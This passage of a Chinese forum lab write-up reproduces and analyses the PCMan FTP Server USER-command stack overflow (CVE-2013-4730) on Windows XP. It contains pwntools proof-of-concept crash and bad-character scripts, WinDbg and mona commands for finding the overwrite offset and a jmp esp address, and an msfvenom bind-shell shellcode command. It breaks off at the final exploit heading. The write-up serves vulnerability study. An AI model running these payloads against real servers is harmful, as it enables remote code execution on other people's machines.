
- [五、参考文献](https://bbs.kanxue.com/#五、参考文献)

## 一、漏洞信息

### 1. 漏洞简述

- 漏洞名称：PCMan FTP Server远程缓冲区溢出
- 漏洞编号：`CVE-2013-4730`
- 漏洞类型：缓冲区溢出
- 漏洞影响：远程代码执行
- 利用难度：Easy
- 详细信息：14fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2W2P5s2m8D9L8$3W2@1i4K6u0V1k6r3u0Q4x3X3g2U0L8$3#2Q4x3V1k6W2P5s2m8D9L8$3W2@1M7#2)9J5c8U0t1$3y4o6M7I4

### 2. 软件概述

PCMan FTP Server用于打开ftp服务，用于上传文件和管理有线及无线设备的软件

## 二、漏洞复现

### 1. 环境搭建

- 靶机环境：Windows xp sp3
- 靶机配置：
  - PCMan FTP Server 2.0.7
  - `windbg`
  - `mona`
- 攻击机：kali 2.0
- 攻击机配置：
  - `pwntools`
  - `metasploit`

### 2. 复现过程

在靶机中运行PCMan FTP，确保21号端口已打开，用`windbg`附加程序

![](https://bbs.kanxue.com/upload/attach/202104/913279_YEUG6UVJU8JBN5J.jpg)

由漏洞的exploit可以得知`USER`字段存在溢出漏洞，编写poc并在 kali 中运行测试

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8 | `from` `pwn` `import` `*`  `context(log_level=` `"debug"`)  `io` `=` `remote(` `"192.168.112.146"`,` `21`)  `print`(io.recv())  `#使用pwntools的cyclic函数构造唯一子串序列`  `fuzz` `=` `flat(` `"USER "`,` cyclic(` `8000`))  `io.sendline(fuzz)`  `print`(io.recv()) |

`windbg`查看pcman ftp的运行状态，发现eip指向了`0x7561617a`非法地址，程序崩溃

![](https://bbs.kanxue.com/upload/attach/202104/913279_XX8SBR7D4HYYM2E.jpg)

观察栈帧结构，栈已被poc发送的数据填满，可以确定存在缓冲区溢出漏洞

![](https://bbs.kanxue.com/upload/attach/202104/913279_25TMDM68JNQCFQW.jpg)

## 三、漏洞分析

### 1. 背景知识

最简单的缓冲区溢出，分析这个漏洞主要熟悉一下用`windbg`进行栈回溯

### 2. 分析思路

#### 思路一

ftp作为网络通信协议，客户端与浏览器进行交互使用socket，那么一定使用了`recv()`函数，在`windbg`中对`recv()`函数下断点，发送poc并单步跟踪，能够找到漏洞函数

#### 思路二

栈回溯：在触发漏洞的内存地址下断点，触发漏洞时观察栈帧的结构，能够找到漏洞函数的地址。这是本文分析使用的方法

### 3. 详细分析

查看触发栈溢出漏洞时的栈帧结构，那么溢出的数据就不能覆盖函数返回地址，就要确定返回地址的位置：发送poc后，eip指向返回地址`0x7561617a`

![](https://bbs.kanxue.com/upload/attach/202104/913279_XX8SBR7D4HYYM2E.jpg)

在利用`pwntools`的`cyclic_find()`函数查看`0x7561617a`在唯一子串序列中的位置，可以确定返回地址在序列的位置为2000（这也是为什么poc使用`cyclic`生成字符串的原因）

![](https://bbs.kanxue.com/upload/attach/202104/913279_F5UA73MS9W8AJMK.jpg)

重新发送poc字符串

|  |  |
| --- | --- |
| 1 | `fuzz` `=` `flat(` `"USER "`,` cyclic(` `2000`),` `'aaaa'`) |

![](https://bbs.kanxue.com/upload/attach/202104/913279_FZHY2ADCBFHTGK6.jpg)

此时返回地址已被‘aaaa’覆盖，令进程在覆盖返回地址之前断下，选择栈中返回地址之前设置硬件条件断点，这里我选择`0x0012ed98`

|  |  |
| --- | --- |
| 1 | `ba w4` `0x0012ed98` `".if(poi(0x0012ed98)==0x74616174){}.else{gc}"` |

重新发送poc后进程在`0x004173af`出断下，`kb`查看栈信息

![](https://bbs.kanxue.com/upload/attach/202104/913279_ZPKF8D8UA8JKMV8.jpg)

栈回溯，利用IDA查看造成缓冲区赋值的函数

`0x00417428`处函数`write_char()`，向指针地址写入一个字节的数据，地址赋值不可能只写一个字节，一定有一个函数循环调用`write_char()`

![](https://bbs.kanxue.com/upload/attach/202104/913279_K3583CZXWAJH7SZ.jpg)

上一层`0x00412ced`，`sprintf`函数，继续返回上一层`0x00403EE6`，即`sub_403E60()`函数

![](https://bbs.kanxue.com/upload/attach/202104/913279_K9G6J2XQXK2QPSK.jpg)

这里使用`sprintf`向Buffer缓冲区赋值

`sprintf`第二个参数`aDDD02d02d05dSS`是格式化格式`%d/%d/%d [%02d:%02d] (%05d) %s> %s`

格式化参数`v5`是`int`类型，`a2`是函数参数`char *`类型

猜想：是没有控制用户的输入长度，直接将字符串`a2`复制到局部变量缓冲区`buffer`导致栈溢出

验证，在`.text:00403EE6 E8 D4 ED 00 00 call _sprintf`设置断点，查看参数`a2`

![](https://bbs.kanxue.com/upload/attach/202104/913279_TWWVA7G8ETXMQ2Q.jpg)

查看`0012edc4`的值，确定是用户的输入字符串，猜想正确

![](https://bbs.kanxue.com/upload/attach/202104/913279_6J9Q6ZWP3YDZPGK.jpg)

这里格式化获取系统时间，并将数据写入文件，可能是为了记录信息到日志中，查看PCMan ftp的日志文件，更加确认了我们的猜想

![](https://bbs.kanxue.com/upload/attach/202104/913279_QDXQQQC7GDNJ6DP.jpg)

![](https://bbs.kanxue.com/upload/attach/202104/913279_DS75EXYQFDJPQS7.jpg)

## 四、漏洞利用

### 1. 利用条件

靶机windows xp sp3关闭DEP保护，使栈上的数据可执行

### 2. 利用过程

#### 2.1 排除坏字符

利用`mona`插件生成一个`0x00`到`0xff`的`bytearray`，发送`payload`，比对哪个字符发送后会破坏`payload`，将其排除即可

|  |  |
| --- | --- |
| 1 | `!py mona bytearray` `-b` `"\x00\x0a\0d"` |

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18 | `from` `pwn` `import` `*`  `context(log_level=` `"debug"`)    `bytearray` `=` `(`  `"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"`  `"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"`  `"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"`  `"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"`  `"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"`  `"\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"`  `"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"`  `"\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"`)    `io` `=` `remote(` `"192.168.112.146"`,` `21`)  `print`(io.recv())  `payload` `=` `flat(` `"USER "`,` cyclic(` `2000`),` `'aaaa'`,` bytearray)`  `io.sendline(payload)`  `print`(io.recv()) |

#### 2.2 查找jmp esp命令

使进程跳转到栈中执行用`jmp esp`指令，查询加载模块中`jmp esp`的地址，机器码 `\xff\xe4`

|  |  |
| --- | --- |
| 1 | `!py mona find` `-s` `"\xff\xe4"` `-m` |

选择一个拥有可执行权限EXECUTE的地址

![](https://bbs.kanxue.com/upload/attach/202104/913279_PT48WSYKU7AU23W.jpg)

#### 2.3 生成shellcode

利用`metasploit`生成windows反弹shell的`shellcode`，开放本地端口4444，排除坏数据’`\x00\x0a\x0d`’，以py格式输出，同时开头由0x20个nop作为滑板

|  |  |
| --- | --- |
| 1 | `msfvenom` `-p windows/` `shell_bind_tcp LPORT=` `4444` `-b` `'\x00\x0a\x0d'`  `-n` `0x20` `-f py` |

![](https://bbs.kanxue.com/upload/attach/202104/913279_XABNKBPX6TD7BE2.jpg)

#### 2.4 编写exploit

|  |  |
| --- | --- |
